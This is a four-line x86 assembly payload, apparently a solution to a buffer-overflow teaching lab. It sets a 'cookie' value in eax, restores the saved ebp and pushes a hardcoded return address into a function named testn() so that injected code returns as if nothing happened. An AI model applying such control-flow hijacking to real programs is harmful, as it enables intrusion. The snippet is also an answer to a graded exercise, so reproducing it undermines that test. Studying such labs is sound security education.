movl    $0x118e7330, %eax    # cookie into eax
lea     0x28(%esp), %ebp     # save old ebp value
pushl   $0x8048e15           # return to right instruction in testn()
ret
